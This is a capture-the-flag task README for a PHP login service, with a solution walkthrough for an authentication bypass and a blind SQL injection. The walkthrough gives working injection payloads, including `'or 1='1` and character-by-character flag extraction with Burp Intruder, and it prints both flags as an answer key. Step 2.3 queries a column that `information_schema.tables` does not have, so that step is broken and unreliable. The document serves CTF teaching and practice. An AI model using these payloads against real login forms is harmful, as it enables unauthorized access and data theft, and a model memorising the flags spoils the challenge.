# 5ql1

## Legend

### Easy Auth (Easy)

#### RU

Сегодня каждый станет администратором.

#### EN

Today, everyone will become an administrator.

### Blind SQLi (Hard)

#### RU

Вы действительно хотите узнать, насколько глубока эта кроличья нора?

#### EN

Are you really wanna go down that rabbit hole?

## Description

Simpe SQL injections in PHP service.

## Solutions

1. Try to inject something like `'or 1='1` after parameters. Flag is waiting for you at `welcome.php` page.

2.1. So, we have blind SQL injection and the conditions are: if sql query returns true (with injection in password field), we will be redirected to `welcome.php` page or we will have an error in other way.

2.2. Of course, we are dealing with MySQL and can dump some table names with a query like `' or (select count(*) from information_schema.tables where table_name LIKE '%flag%') > 0 and '1' = '1`. 

2.3. We need to know the table name where the flag is stored and than we can start to guess column names with something like `' or (select count(*) from information_schema.tables where table_name = 'secret' and column_name = 'flag') > 0 and '1' = '1`. 

2.4. Than we can prepare our payload for Burp Suite: let's use `' or (select SUBSTR(flag, 1, 1) from secret) = '$a$' and '1' = '1` in intruder, where '$a$' is a parameter name with values in range `A-Z, a-z, 0-9, _, {, }`.

2.5. Do that in a loop changing `SUBSTR(flag, 1, 1)` to `SUBSTR(flag, 2, 1)` and so on. This method will give us full flag letter by letter.

## Flags

**HITS{g00d_st4rt_br0}**

**HITS{r34lly_un3xp3ct3d_4ch13v3m3nt_f0r_4_h175_57ud3n7}**

## Handout

*nothing*

## Acknowledgements

Service originally made by https://github.com/dnyaneshwargiri
